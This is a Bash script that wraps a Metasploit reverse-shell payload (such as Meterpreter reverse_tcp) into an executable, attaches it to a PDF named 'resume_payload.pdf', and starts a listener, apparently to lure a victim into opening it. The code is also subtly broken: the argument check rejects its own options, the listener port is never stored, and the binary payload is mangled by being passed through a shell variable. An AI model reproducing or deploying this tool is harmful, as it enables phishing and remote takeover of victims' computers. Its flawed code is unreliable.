#!/bin/bash

if [[ $# -eq 0 ]] || [[ $# -gt 1 ]]; then
    echo "Usage: $0 [-h] [-t TYPE] [-a ARCH] [-p PLATFORM] [-l IP_ADDRESS] <PDF_FILE>"
    exit 1
fi

if [ ! -f "$1" ]; then
    echo "Error: File not found: $1"
    exit 1
fi

LHOST="$(ip route get 1 | awk '{print $NF;exit}')"
PAYLOAD_TYPE=""
PAYLOAD_ARCH=""
PAYLOAD_PLATFORM=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    -h|--help)
      echo "Usage: $0 [-h] [-t TYPE] [-a ARCH] [-p PLATFORM] [-l IP_ADDRESS] <PDF_FILE>"
      echo "  -h, --help            Show this help message and exit"
      echo "  -t, --type TYPE       Payload type (e.g. windows/meterpreter/reverse_tcp)"
      echo "  -a, --arch ARCH       Payload architecture (e.g. x86)"
      echo "  -p, --platform PLATFORM   Payload platform (e.g. windows)"
      echo "  -l, --lhost IP_ADDRESS    Local IP address to use (default: auto-detect)"
      exit 0
      ;;
    -t|--type)
      PAYLOAD_TYPE="$2"
      shift 2
      ;;
    -a|--arch)
      PAYLOAD_ARCH="$2"
      shift 2
      ;;
    -p|--platform)
      PAYLOAD_PLATFORM="$2"
      shift 2
      ;;
    -l|--lhost)
      LHOST="$2"
      shift 2
      ;;
    *)
      break
      ;;
  esac
done

PDF_FILE="$1"

if [ -z "$PAYLOAD_TYPE" ]; then
  read -p "Payload type (e.g. windows/meterpreter/reverse_tcp): " PAYLOAD_TYPE
fi

if [ -z "$PAYLOAD_ARCH" ]; then
  read -p "Payload architecture (e.g. x86): " PAYLOAD_ARCH
fi

if [ -z "$PAYLOAD_PLATFORM" ]; then
  read -p "Payload platform (e.g. windows): " PAYLOAD_PLATFORM
fi

if ! command -v pdftk &> /dev/null; then
  echo "Error: pdftk could not be found. Please install pdftk before running this script." >&2
  exit 1
fi

if ! command -v msfvenom &> /dev/null; then
  echo "Error: msfvenom could not be found. Please install Metasploit Framework before running this script." >&2
  exit 1
fi

PAYLOAD=$(msfvenom -p "$PAYLOAD_TYPE" LHOST="$LHOST" LPORT=$(shuf -i 2000-65000 -n 1) -f exe --arch "$PAYLOAD_ARCH" --platform "$PAYLOAD_PLATFORM")

WORKDIR=$(mktemp -d)

if [ ! -d "$WORKDIR" ]; then
    echo "Error: Could not create temporary directory." >&2
    exit 1
fi

if ! echo -n "$PAYLOAD" > "$WORKDIR/payload.exe"; then
    echo "Error: Could not create payload file." >&2
    rm -rf "$WORKDIR"
    exit 1
fi
if ! pdftk "$PDF_FILE" attach_files "$WORKDIR/payload.exe" to_page 1 output "$WORKDIR/resume_payload.pdf"; then
echo "Error: Could not inject payload into PDF file." >&2
rm -rf "$WORKDIR"
exit 1
fi

PAYLOAD_TYPE_ESCAPED=$(echo "$PAYLOAD_TYPE" | sed 's|/|\/|g')

if ! msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE_ESCAPED; set LHOST $LHOST; set LPORT $LPORT; exploit -j" &> /dev/null; then
echo "Error: Could not start Metasploit listener." >&2
rm -rf "$WORKDIR"
exit 1
fi

if ! xdg-open "$WORKDIR/resume_payload.pdf"; then
echo "Error: Could not open PDF file." >&2
rm -rf "$WORKDIR"
exit 1
fi

if ! rm -rf "$WORKDIR"; then
echo "Error: Could not clean up temporary files." >&2
exit 1
fi

echo "PDF file with injected payload has been created and opened in your default PDF viewer."
echo "A Metasploit listener has been started in the background. Use 'jobs' to check the status of the job."
echo "To stop the listener, use 'kill %1' where 1 is the job number."
